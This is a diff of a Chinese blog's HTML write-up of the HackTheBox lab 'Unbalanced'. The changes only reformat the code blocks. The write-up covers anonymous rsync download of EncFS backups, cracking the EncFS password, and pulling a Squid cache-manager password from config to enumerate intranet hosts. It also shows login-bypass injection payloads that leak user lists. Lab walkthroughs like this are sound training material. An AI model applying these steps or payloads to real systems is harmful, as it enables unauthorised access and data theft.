@@ -470,13 +470,46 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li>攻击机 10.10.14.11</li>
 </ul>
 <h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>nmap</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Fri Aug  7 11:01:56 2020 as: nmap -sC -sV -oA nmap/unbalance 10.10.10.200</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.200</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)</span><br><span class="line">|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)</span><br><span class="line">|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)</span><br><span class="line">873/tcp  open  rsync      (protocol version 31)</span><br><span class="line">3128/tcp open  http-proxy Squid http proxy 4.6</span><br><span class="line">|_http-server-header: squid/4.6</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Fri Aug  7 11:03:34 2020 -- 1 IP address (1 host up) scanned in 98.87 seconds</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash"># Nmap 7.80 scan initiated Fri Aug  7 11:01:56 2020 as: nmap -sC -sV -oA nmap/unbalance 10.10.10.200
+Nmap scan report for 10.10.10.200
+Host is up (0.43s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
+|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
+|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
+873/tcp  open  rsync      (protocol version 31)
+3128/tcp open  http-proxy Squid http proxy 4.6
+|_http-server-header: squid/4.6
+|_http-title: ERROR: The requested URL could not be retrieved
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Aug  7 11:03:34 2020 -- 1 IP address (1 host up) scanned in 98.87 seconds</code></pre>
 <p>873有rsync.3128有squid。既然rsync开放,在htb这种环境里肯定存在未授权访问的。所以探测并下载下来。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~/htb/boxes/Unbalanced/<span class="comment"># rsync 10.10.10.200::</span></span><br><span class="line">conf_backups    EncFS-encrypted configuration backups</span><br><span class="line">root@byc404:~/htb/boxes/Unbalanced/<span class="comment"># rsync 192.168.122.1::conf_backups ./rsync_backup</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">root@byc404:~/htb/boxes/Unbalanced/# rsync 10.10.10.200::
+conf_backups    EncFS-encrypted configuration backups
+root@byc404:~/htb/boxes/Unbalanced/# rsync 192.168.122.1::conf_backups ./rsync_backup</code></pre>
 <p>得到conf_backups文件夹。看下内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~/htb/boxes/Unbalanced/rsync_backup<span class="comment"># ls -la</span></span><br><span class="line">-rw-r--r-- 1 root root   2980 Apr  4 23:05 A4qOD1nvqe9JgKnslwk1sUzO                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1138 Apr  4 23:05 a4zdmLrBYDC24s9Z59y-Pwa2                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root    443 Apr  4 23:05 Acv0PEQX8vs-KdK307QNHaiF                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root    935 Apr  4 23:05 B6J5M3OP0X7W25ITnaZX753T                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   3643 Apr  4 23:05 c9w3APbCYWfWLsq7NFOdjQpA                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root    288 Apr  4 23:05 ,CBjPJW4EGlcqwZW4nmVqBA6                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1521 Apr  4 23:05 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1                                                                                                   </span><br><span class="line">-rw-r--r-- 1 root root    332 Apr  4 23:05 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1                                                                                                   </span><br><span class="line">-rw-r--r-- 1 root root   2592 Apr  4 23:05 dF2GU58wFl3x5R7aDE6QEnDj                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1268 Apr  4 23:05 dNTEvgsjgG6lKBr8ev8Dw,p7                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   2359 Apr  4 23:05 ECXONXBBRwhb5tYOIcjjFZzh                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1297 Apr  2 21:06 .encfs6.xml                                                                                                                                      </span><br><span class="line">-rw-r--r-- 1 root root   1464 Apr  4 23:05 F4F9opY2nhVVnRgiQ,OUs-Y0     </span><br><span class="line">-rw-r--r-- 1 root root    354 Apr  4 23:05 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@byc404:~/htb/boxes/Unbalanced/rsync_backup# ls -la
+-rw-r--r-- 1 root root   2980 Apr  4 23:05 A4qOD1nvqe9JgKnslwk1sUzO                                                                                                                         
+-rw-r--r-- 1 root root   1138 Apr  4 23:05 a4zdmLrBYDC24s9Z59y-Pwa2                                                                                                                         
+-rw-r--r-- 1 root root    443 Apr  4 23:05 Acv0PEQX8vs-KdK307QNHaiF                                                                                                                         
+-rw-r--r-- 1 root root    935 Apr  4 23:05 B6J5M3OP0X7W25ITnaZX753T                                                                                                                         
+-rw-r--r-- 1 root root   3643 Apr  4 23:05 c9w3APbCYWfWLsq7NFOdjQpA                                                                                                                         
+-rw-r--r-- 1 root root    288 Apr  4 23:05 ,CBjPJW4EGlcqwZW4nmVqBA6                                                                                                                         
+-rw-r--r-- 1 root root   1521 Apr  4 23:05 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1                                                                                                   
+-rw-r--r-- 1 root root    332 Apr  4 23:05 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1                                                                                                   
+-rw-r--r-- 1 root root   2592 Apr  4 23:05 dF2GU58wFl3x5R7aDE6QEnDj                                                                                                                         
+-rw-r--r-- 1 root root   1268 Apr  4 23:05 dNTEvgsjgG6lKBr8ev8Dw,p7                                                                                                                         
+-rw-r--r-- 1 root root   2359 Apr  4 23:05 ECXONXBBRwhb5tYOIcjjFZzh                                                                                                                         
+-rw-r--r-- 1 root root   1297 Apr  2 21:06 .encfs6.xml                                                                                                                                      
+-rw-r--r-- 1 root root   1464 Apr  4 23:05 F4F9opY2nhVVnRgiQ,OUs-Y0     
+-rw-r--r-- 1 root root    354 Apr  4 23:05 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
+
+.....</code></pre>
 <p>发现文件名似乎都是处理过的hashstring.有个<code>.encfs6.xml</code>但是内容看不出什么敏感数据。</p>
 <p>google搜索了下发现这是encfs加密得到配置文件。<code>encfs</code>加密的用法简单来说,就是你可以指定一个被加密的文件夹,再mount另一个文件夹作为加密文件夹。执行encfs后,被加密的文件夹的内容以及文件名就在加密文件夹就会自动生成。此时加密文件夹会留下一个<code>.encfs6.xml</code></p>
 <p>这种情况经常出现在使用自动同步的情况里面。因为encfs一旦为两个文件夹建立了映射,就会自动加密新放入的文件。正因如此,使用rsync处理encfs加密后的文件夹也是一种常见选择。而一旦出现了rsync未授权访问就将导致进一步的信息泄露。实战中完全可能。</p>
@@ -484,11 +517,33 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>先使用encfs2john.py转换。然后爆破即可</p>
 <p>结果<br><code>$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add:bubblegum</code></p>
 <p>bubblegum就是encfs密码。<br>然后解密文件夹。把解密的文件夹放到<code>rsync_decrypt</code>里去。注意这里的路径只接受绝对路径。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENCFS6_CONFIG=/root/htb/boxes/Unbalanced/rsync_backup/.encfs6.xml encfs /root/htb/boxes/Unbalanced/rsync_backup /root/htb/boxes/Unbalanced/rsync_decrypt</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">ENCFS6_CONFIG=/root/htb/boxes/Unbalanced/rsync_backup/.encfs6.xml encfs /root/htb/boxes/Unbalanced/rsync_backup /root/htb/boxes/Unbalanced/rsync_decrypt</code></pre>
 <p>得到解密文件夹后。发现有几十个conf文件。基本就是平时会放到<code>/etc</code>下的那些<code>.conf</code>文件。</p>
 <p>这里明显需要抓重点。基于之前我们探测时发现有squid代理开放。所以找到squid.conf。<br>squid.conf同样要抓重点。因为里面有上千行内容。比较方便的方法是直接<code>cat squid.conf| grep htb</code>找到一个域名。或者后来我拿到本机上用vscode看时因为注释部分跟未注释部分有明显的绿色与白色差别。所以可以很快拖着看。找到所有关键信息。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Only allow cachemgr access from localhost</span><br><span class="line">#http_access allow localhost manager</span><br><span class="line">#http_access deny manager</span><br><span class="line">http_access allow manager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#http_access allow localnet</span><br><span class="line">http_access allow localhost</span><br><span class="line"></span><br><span class="line"># Allow access to intranet</span><br><span class="line">acl intranet dstdomain -n intranet.unbalanced.htb</span><br><span class="line">acl intranet_net dst -n 172.16.0.0&#x2F;12</span><br><span class="line">http_access allow intranet</span><br><span class="line">http_access allow intranet_net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># cachemgr_passwd secret shutdown</span><br><span class="line"># cachemgr_passwd lesssssssecret info stats&#x2F;objects</span><br><span class="line"># cachemgr_passwd disable all</span><br><span class="line">#Default:</span><br><span class="line"># No password. Actions which require password are denied.</span><br><span class="line">cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events</span><br><span class="line">cachemgr_passwd disable all</span><br></pre></td></tr></table></figure>
-<p>几个关键点。</p>
+<pre><code>
+# Only allow cachemgr access from localhost
+#http_access allow localhost manager
+#http_access deny manager
+http_access allow manager
+
+
+#http_access allow localnet
+http_access allow localhost
+
+# Allow access to intranet
+acl intranet dstdomain -n intranet.unbalanced.htb
+acl intranet_net dst -n 172.16.0.0/12
+http_access allow intranet
+http_access allow intranet_net
+
+
+# cachemgr_passwd secret shutdown
+# cachemgr_passwd lesssssssecret info stats/objects
+# cachemgr_passwd disable all
+#Default:
+# No password. Actions which require password are denied.
+cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
+cachemgr_passwd disable all</code></pre><p>几个关键点。</p>
 <ul>
 <li><code>intranet.unbalanced.htb</code> 域名。不过是内网ip</li>
 <li>cachemgr_passwd 即cache manager的密码<code>Thah$Sh1</code></li>
@@ -504,35 +559,194 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>The cache manager (cachemgr.cgi) is a CGI utility for displaying statistics about the squid process as it runs</p>
 </blockquote>
 <p>简单看下发现我们是可以调用cachemgr的命令的。之前在squid.conf中跟在密码后的一大组文字其实就是各种可调用的命令。<br>搜索了下调用方式。发现可以<code>telnet</code>连接代理服务器然后再传一个http报头。不过后来找到一个debian就有的<code>squidclient</code>命令行.更加方便。<br>我们先调用下<code>menu</code>命令。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> root@byc404:~/htb/boxes/Unbalanced<span class="comment">#   squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu                                                                                                      </span></span><br><span class="line">HTTP/1.1 200 OK                                                                               </span><br><span class="line">Server: squid/4.6                                                                             </span><br><span class="line">Mime-Version: 1.0                                                                             </span><br><span class="line">Date: Sat, 15 Aug 2020 02:17:42 GMT                                                           </span><br><span class="line">Content-Type: text/plain;charset=utf-8                                                        </span><br><span class="line">Expires: Sat, 15 Aug 2020 02:17:42 GMT                                                        </span><br><span class="line">Last-Modified: Sat, 15 Aug 2020 02:17:42 GMT                                                  </span><br><span class="line">X-Cache: MISS from unbalanced                                                                 </span><br><span class="line">X-Cache-Lookup: MISS from unbalanced:3128                                                     </span><br><span class="line">Via: 1.1 unbalanced (squid/4.6)                                                               </span><br><span class="line">Connection: close                                                                             </span><br><span class="line">                                                                                              </span><br><span class="line"> index                  Cache Manager Interface                 disabled</span><br><span class="line"> menu                   Cache Manager Menu                      protected</span><br><span class="line"> offline_toggle         Toggle offline_mode setting             disabled</span><br><span class="line"> shutdown               Shut Down the Squid Process             disabled</span><br><span class="line"> reconfigure            Reconfigure Squid                       disabled</span><br><span class="line"> rotate                 Rotate Squid Logs                       disabled</span><br><span class="line"> pconn                  Persistent Connection Utilization Histograms    protected</span><br><span class="line"> mem                    Memory Utilization                      protected</span><br><span class="line"> diskd                  DISKD Stats                             protected</span><br><span class="line"> squidaio_counts        Async IO Function Counters              disabled</span><br><span class="line"> config                 Current Squid Configuration             disabled </span><br><span class="line"> client_list            Cache Client List                       disabled </span><br><span class="line"> comm_epoll_incoming    comm_incoming() stats                   disabled </span><br><span class="line"> ipcache                IP Cache Stats and Contents             disabled</span><br><span class="line"> fqdncache              FQDN Cache Stats and Contents           protected</span><br><span class="line"> idns                   Internal DNS Statistics                 disabled</span><br><span class="line"> redirector             URL Redirector Stats                    disabled</span><br><span class="line"> store_id               StoreId helper Stats                    disabled</span><br><span class="line"> external_acl           External ACL stats                      disabled</span><br><span class="line"> http_headers           HTTP Header Statistics                  disabled      </span><br><span class="line"> external_acl           External ACL stats                      disabled</span><br><span class="line"> http_headers           HTTP Header Statistics                  disabled                      </span><br><span class="line"> info                   General Runtime Information             disabled                      </span><br><span class="line"> service_times          Service Times (Percentiles)             disabled                                                                </span><br><span class="line"> filedescriptors        Process Filedescriptor Allocation       protected                     </span><br><span class="line"> objects                All Cache Objects                       protected                     </span><br><span class="line"> vm_objects             In-Memory and In-Transit Objects        protected                     </span><br><span class="line"> io                     Server-side network <span class="built_in">read</span>() size histograms      disabled              </span><br><span class="line"> counters               Traffic and Resource Counters           protected                     </span><br><span class="line"> peer_select            Peer Selection Algorithms               disabled                      </span><br><span class="line"> digest_stats           Cache Digest and ICP blob               disabled                      </span><br><span class="line"> 5min                   5 Minute Average of Counters            protected                     </span><br><span class="line"> 60min                  60 Minute Average of Counters           protected                     </span><br><span class="line"> utilization            Cache Utilization                       disabled                      </span><br><span class="line"> histograms             Full Histogram Counts                   protected                     </span><br><span class="line"> active_requests        Client-side Active Requests             disabled                      </span><br><span class="line"> username_cache         Active Cached Usernames                 disabled</span><br><span class="line"> openfd_objects         Objects with Swapout files open         disabled </span><br><span class="line"> store_digest           Store Digest                            disabled</span><br><span class="line"> store_log_tags         Histogram of store.log tags             disabled</span><br><span class="line"> storedir               Store Directory Stats                   disabled</span><br><span class="line"> store_io               Store IO Interface Stats                disabled</span><br><span class="line"> store_check_cachable_stats     storeCheckCachable() Stats              disabled </span><br><span class="line"> refresh                Refresh Algorithm Statistics            disabled </span><br><span class="line"> delay                  Delay Pool Levels                       disabled </span><br><span class="line"> forward                Request Forwarding Statistics           disabled</span><br><span class="line"> cbdata                 Callback Data Registry Contents         protected</span><br><span class="line"> sbuf                   String-Buffer statistics                protected</span><br><span class="line"> events                 Event Queue                             protected</span><br><span class="line"> netdb                  Network Measurement Database            disabled</span><br><span class="line"> asndb                  AS Number Database                      disabled </span><br><span class="line"> carp                   CARP information                        disabled</span><br><span class="line"> userhash               peer userhash information               disabled</span><br><span class="line"> sourcehash             peer sourcehash information             disabled</span><br><span class="line"> server_list            Peer Cache Statistics                   disabled</span><br></pre></td></tr></table></figure>
+<pre><code class="bash"> root@byc404:~/htb/boxes/Unbalanced#   squidclient -h 10.10.10.200 -w &#39;Thah$Sh1&#39; mgr:menu                                                                                                      
+HTTP/1.1 200 OK                                                                               
+Server: squid/4.6                                                                             
+Mime-Version: 1.0                                                                             
+Date: Sat, 15 Aug 2020 02:17:42 GMT                                                           
+Content-Type: text/plain;charset=utf-8                                                        
+Expires: Sat, 15 Aug 2020 02:17:42 GMT                                                        
+Last-Modified: Sat, 15 Aug 2020 02:17:42 GMT                                                  
+X-Cache: MISS from unbalanced                                                                 
+X-Cache-Lookup: MISS from unbalanced:3128                                                     
+Via: 1.1 unbalanced (squid/4.6)                                                               
+Connection: close                                                                             
 
+ index                  Cache Manager Interface                 disabled
+ menu                   Cache Manager Menu                      protected
+ offline_toggle         Toggle offline_mode setting             disabled
+ shutdown               Shut Down the Squid Process             disabled
+ reconfigure            Reconfigure Squid                       disabled
+ rotate                 Rotate Squid Logs                       disabled
+ pconn                  Persistent Connection Utilization Histograms    protected
+ mem                    Memory Utilization                      protected
+ diskd                  DISKD Stats                             protected
+ squidaio_counts        Async IO Function Counters              disabled
+ config                 Current Squid Configuration             disabled 
+ client_list            Cache Client List                       disabled 
+ comm_epoll_incoming    comm_incoming() stats                   disabled 
+ ipcache                IP Cache Stats and Contents             disabled
+ fqdncache              FQDN Cache Stats and Contents           protected
+ idns                   Internal DNS Statistics                 disabled
+ redirector             URL Redirector Stats                    disabled
+ store_id               StoreId helper Stats                    disabled
+ external_acl           External ACL stats                      disabled
+ http_headers           HTTP Header Statistics                  disabled      
+ external_acl           External ACL stats                      disabled
+ http_headers           HTTP Header Statistics                  disabled                      
+ info                   General Runtime Information             disabled                      
+ service_times          Service Times (Percentiles)             disabled                                                                
+ filedescriptors        Process Filedescriptor Allocation       protected                     
+ objects                All Cache Objects                       protected                     
+ vm_objects             In-Memory and In-Transit Objects        protected                     
+ io                     Server-side network read() size histograms      disabled              
+ counters               Traffic and Resource Counters           protected                     
+ peer_select            Peer Selection Algorithms               disabled                      
+ digest_stats           Cache Digest and ICP blob               disabled                      
+ 5min                   5 Minute Average of Counters            protected                     
+ 60min                  60 Minute Average of Counters           protected                     
+ utilization            Cache Utilization                       disabled                      
+ histograms             Full Histogram Counts                   protected                     
+ active_requests        Client-side Active Requests             disabled                      
+ username_cache         Active Cached Usernames                 disabled
+ openfd_objects         Objects with Swapout files open         disabled 
+ store_digest           Store Digest                            disabled
+ store_log_tags         Histogram of store.log tags             disabled
+ storedir               Store Directory Stats                   disabled
+ store_io               Store IO Interface Stats                disabled
+ store_check_cachable_stats     storeCheckCachable() Stats              disabled 
+ refresh                Refresh Algorithm Statistics            disabled 
+ delay                  Delay Pool Levels                       disabled 
+ forward                Request Forwarding Statistics           disabled
+ cbdata                 Callback Data Registry Contents         protected
+ sbuf                   String-Buffer statistics                protected
+ events                 Event Queue                             protected
+ netdb                  Network Measurement Database            disabled
+ asndb                  AS Number Database                      disabled 
+ carp                   CARP information                        disabled
+ userhash               peer userhash information               disabled
+ sourcehash             peer sourcehash information             disabled
+ server_list            Peer Cache Statistics                   disabled</code></pre>
 <p>可以看到除了squid配置中已经标出的可用命令外,其他都是disabled的。所以我们依次调用下寻找关键信息。<br>在调用到<code>fqdncache</code>时</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FQDN Cache Statistics:</span><br><span class="line">FQDNcache Entries In Use: 13</span><br><span class="line">FQDNcache Entries Cached: 11</span><br><span class="line">FQDNcache Requests: 12782</span><br><span class="line">FQDNcache Hits: 0</span><br><span class="line">FQDNcache Negative Hits: 7080</span><br><span class="line">FQDNcache Misses: 5702</span><br><span class="line">FQDN Cache Contents:</span><br><span class="line"></span><br><span class="line">Address                                       Flg TTL Cnt Hostnames</span><br><span class="line">10.10.14.6                                     N  -16959   0</span><br><span class="line">127.0.1.1                                       H -001   2 unbalanced.htb unbalanced</span><br><span class="line">::1                                             H -001   3 localhost ip6-localhost ip6-loopback</span><br><span class="line">172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb</span><br><span class="line">172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb</span><br><span class="line">10.10.10.200                                   N  -1086   0</span><br><span class="line">127.0.0.1                                       H -001   1 localhost</span><br><span class="line">172.17.0.1                                      H -001   1 intranet.unbalanced.htb</span><br><span class="line">ff02::1                                         H -001   1 ip6-allnodes</span><br><span class="line">ff02::2                                         H -001   1 ip6-allrouters</span><br><span class="line">10.10.14.65                                    N  025   0</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">FQDN Cache Statistics:
+FQDNcache Entries In Use: 13
+FQDNcache Entries Cached: 11
+FQDNcache Requests: 12782
+FQDNcache Hits: 0
+FQDNcache Negative Hits: 7080
+FQDNcache Misses: 5702
+FQDN Cache Contents:
 
+Address                                       Flg TTL Cnt Hostnames
+10.10.14.6                                     N  -16959   0
+127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
+::1                                             H -001   3 localhost ip6-localhost ip6-loopback
+172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
+172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
+10.10.10.200                                   N  -1086   0
+127.0.0.1                                       H -001   1 localhost
+172.17.0.1                                      H -001   1 intranet.unbalanced.htb
+ff02::1                                         H -001   1 ip6-allnodes
+ff02::2                                         H -001   1 ip6-allrouters
+10.10.14.65                                    N  025   0</code></pre>
 <p>看到<code>intranet-host3.unbalanced.htb</code>及对应的ip。不难想到内网里可能还有其他服务。这里先访问<code>172.31.179.2</code>与<code>172.31.179.3</code>.发现会被重定向到<code>/inranet.php</code>也就是跟之前同样的网页。但是顺着访问<code>172.31.179.1</code>时<br><img src="/2020/08/15/hackthebox-Unbalanced/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>没有出现重定向。这种怪异行为值得重视。我们再次访问<code>172.31.179.1/intranet.php</code>。这次尝试登录时,会发现它会回显<code>Invalid credentials.</code>.也就是说可以跟服务交互了。</p>
 <p>既然如此肯定就要在登录参数作文章。无非不就是sqli那一套。简单尝试后发现密码处存在注入.当以<code>abc&#39; or &#39;1&#39;=&#39;1</code>作为密码时会回显四个用户名与对应邮箱。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> rita</span><br><span class="line">Rita Fubelli</span><br><span class="line"></span><br><span class="line">rita@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: HR Manager</span><br><span class="line"></span><br><span class="line">jim</span><br><span class="line">Jim Mickelson</span><br><span class="line"></span><br><span class="line">jim@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: Web Designer</span><br><span class="line"></span><br><span class="line">bryan</span><br><span class="line">Bryan Angstrom</span><br><span class="line"></span><br><span class="line">bryan@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: System Administrator</span><br><span class="line"></span><br><span class="line">sarah</span><br><span class="line">Sarah Goodman</span><br><span class="line"></span><br><span class="line">sarah@unbalanced.htb</span><br><span class="line"></span><br><span class="line">Role: Team Leader</span><br></pre></td></tr></table></figure>
+<pre><code> rita
+Rita Fubelli
 
-<p>bryan是<code>Administrator</code>.说明很有可能就是需要他的信息。不过这里有个细节上需要注意下。当我尝试如<code>abc&#39; or 1=1#</code>这样的payload不可行,<code>abc&#39; or substr(&#39;abc&#39;,1,1)=&#39;a</code>也不可行。但是<code>abc&#39; or substring(&#39;abc&#39;,1,1)=&#39;a</code>是回显了真值的。那么这里真的是sql注入吗？答案是否定的。我很快联想到曾经在npuctf中出现过一次的xpath注入。加上这里并没有执行所谓的登录操作，而是在界面回显html块内容。我可以判断,这里应该是一个xpath注入而不是sql注入。</p>
+rita@unbalanced.htb
+
+Role: HR Manager
+
+jim
+Jim Mickelson
+
+jim@unbalanced.htb
+
+Role: Web Designer
+
+bryan
+Bryan Angstrom
+
+bryan@unbalanced.htb
+
+Role: System Administrator
+
+sarah
+Sarah Goodman
+
+sarah@unbalanced.htb
+
